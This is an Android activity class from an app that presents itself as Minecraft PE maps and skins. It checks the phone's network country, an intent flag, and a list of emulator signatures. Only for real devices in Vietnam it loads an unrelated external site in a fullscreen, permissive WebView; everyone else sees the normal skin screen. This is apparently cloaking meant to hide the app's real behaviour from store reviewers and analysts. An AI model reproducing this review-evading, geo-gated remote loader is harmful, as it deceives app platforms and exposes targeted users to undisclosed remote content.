package com.mapformcpe.popularmapsforminecraftpe;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.Message;
import android.telephony.TelephonyManager;
import android.view.WindowManager;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import androidx.appcompat.app.AppCompatActivity;


public class AppModeSkin extends AppCompatActivity {

    WebView web;
    String ab;

    @SuppressLint("MissingInflatedId")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        this.getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN
                , WindowManager.LayoutParams.FLAG_FULLSCREEN);
        setContentView(R.layout.activity_app_mon);

        web = findViewById(R.id.westApp);
        Intent intent = getIntent();
        ab=intent.getStringExtra("check");

        web.getSettings().setJavaScriptEnabled(true);
        this.web.setWebViewClient(new WebViewClient());
        this.web.getSettings().setDomStorageEnabled(true);
        this.web.getSettings().setLoadWithOverviewMode(true);
        this.web.getSettings().setJavaScriptEnabled(true);
        this.web.getSettings().setSaveFormData(true);
        this.web.setWebChromeClient(new WebChromeClient() {
            @Override
            public boolean onCreateWindow(WebView view, boolean isDialog, boolean isUserGesture, Message resultMsg) {
                WebView webView = new WebView(view.getContext());
                webView.setWebViewClient(new WebViewClient());
                webView.getSettings().setDomStorageEnabled(true);
                webView.getSettings().setLoadWithOverviewMode(true);
                webView.getSettings().setJavaScriptEnabled(true);
                webView.getSettings().setSaveFormData(true);
                webView.getSettings().setAllowFileAccess(true);
                webView.getSettings().setAllowFileAccess(true);
                webView.getSettings().setAllowContentAccess(true);
                webView.getSettings().setSupportMultipleWindows(true);
                webView.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
                webView.getSettings().setRenderPriority(WebSettings.RenderPriority.HIGH);
                webView.getSettings().setUserAgentString("Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.65 Mobile Safari/537.36");
                webView.setWebViewClient(new WebViewClient() {
                    @Override
                    public boolean shouldOverrideUrlLoading(WebView view, String url) {
                        web.loadUrl(url);
                        return true;

                    }
                });
                ((WebView.WebViewTransport) resultMsg.obj).setWebView(webView);
                resultMsg.sendToTarget();
                return true;
            }
        });
        this.web.getSettings().setAllowFileAccess(true);
        this.web.getSettings().setAllowFileAccess(true);
        this.web.getSettings().setAllowContentAccess(true);
        this.web.getSettings().setSupportMultipleWindows(true);
        this.web.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
        this.web.getSettings().setRenderPriority(WebSettings.RenderPriority.HIGH);
        this.web.getSettings().setUserAgentString("Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.65 Mobile Safari/537.36");

        //kiểm tra vùngcủa sdt
        TelephonyManager tm = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
        String countryIso = tm.getNetworkCountryIso();
        if ((countryIso.equals("vn") || countryIso.equals("VN")) && ab.equals("true") && !isRunningOnEmulator() ) {
            this.web.loadUrl("https://www.taiappgame.us/wkleo");
        } else {
            startActivity(new Intent(AppModeSkin.this, bodySkin.class));
        }
    }


    @SuppressLint("MissingSuperCall")
    @Override
    public void onBackPressed() {
        if (web.canGoBack()) {
            web.goBack();
        } else {
//            super.onBackPressed();
            finishAffinity();
        }
    }
    public static boolean isRunningOnEmulator() {
        return (Build.FINGERPRINT.contains("generic")
                || Build.FINGERPRINT.contains("unknown")
                || Build.MODEL.contains("google_sdk")
                || Build.MODEL.contains("Emulator")
                || Build.MODEL.contains("Android SDK built for x86")
                || Build.MANUFACTURER.contains("Genymotion")
                || (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic"))
                || "google_sdk".equals(Build.PRODUCT)
                || "sdk".equals(Build.PRODUCT));
    }
}